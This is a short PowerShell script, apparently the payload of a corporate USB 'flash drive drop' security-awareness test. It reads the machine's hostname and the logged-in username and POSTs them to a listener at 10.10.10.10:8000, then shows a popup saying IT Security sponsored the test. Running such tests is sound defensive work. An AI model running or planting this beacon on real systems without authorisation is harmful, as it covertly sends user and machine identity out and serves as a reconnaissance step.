$computerSystem = hostname
$name = whoami
Invoke-WebRequest -Method 'POST' -Uri "http://10.10.10.10:8000/name=$name&computer=$computerSystem"
$wshell = New-Object -ComObject Wscript.Shell
$wshell.Popup("This test was sponsored by the IT Security Department. Your computer has not been impacted. Please return this flash drive to IT on the 10th floor.",0,"IT Security Flash Drive Drop Test",0x1)
